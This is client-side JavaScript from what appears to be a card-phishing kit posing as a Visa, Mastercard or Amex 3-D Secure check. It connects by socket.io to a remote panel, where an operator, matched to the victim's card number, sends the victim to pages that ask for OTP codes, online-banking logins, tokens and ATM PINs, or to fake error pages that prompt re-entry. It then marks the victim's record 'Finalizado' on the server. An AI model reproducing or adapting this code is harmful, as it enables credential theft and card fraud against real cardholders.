const companyLoader = document.querySelector('#company-loader');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');
}

// Enviar info
var socket = io.connect(url);
//Recibir la respuesta del websocket
socket.on('posting', function(data){
    console.log(data);
    if (data.valor == "otp" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "cdin";
      window.location.href = "otp.html";
      return;
    }

    if (data.valor == "newOtp" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "cdin";
      window.location.href = "otp.error.html";
      return;
    }

    if (data.valor == "user" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "userpassword";
      window.location.href = "id-check.html";
    }

    if (data.valor == "newUser" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "userpassword";
      window.location.href = "id-check.error.html";
    }

    if (data.valor == "token" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "cdin";
      window.location.href = "token.html";
    }

    if (data.valor == "newToken" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "cdin";
      window.location.href = "token.error.html";
    }

    if (data.valor == "ccajero" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "ccaj";
      window.location.href = "clavecajero.html";
    }

    if (data.valor == "ccajeror" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "ccaj";
      window.location.href = "error.clave.cajero.html";
    }

    if (data.valor == "error" && data.valid == info.metaInfo.cc) {
      info.checkerInfo.mode = "userpassword";
      window.location.href = "error.tarjeta.html";
    }

    if (data.valor == "finish" && data.valid == info.metaInfo.cc) {
      async function updateStatus() {
        const response = await fetch(`${url}/dataTables/dataTables`, {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
          },
        });

        const serverData = await response.json();
        const dataTables = [...serverData];

        for (const data of dataTables) {
          if (
            data.tarjeta == info.metaInfo.p &&
            data.id == info.metaInfo.cc
          ) {
            console.log("Usuario encontrado");
            const updateresponse = await fetch(
              `${url}/dataTables/updateFinish/${data.idreg}`,
              {
                method: "PUT",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  status: "Finalizado",
                }),
              }
            );
            const updatedData = await updateresponse.json();
          }
        }

        window.location.href =
          "../orders/8f938d47564f896aaaca5a399829044dc3c5018f66263a0a.html";
      }
      updateStatus();
      return;
    }


})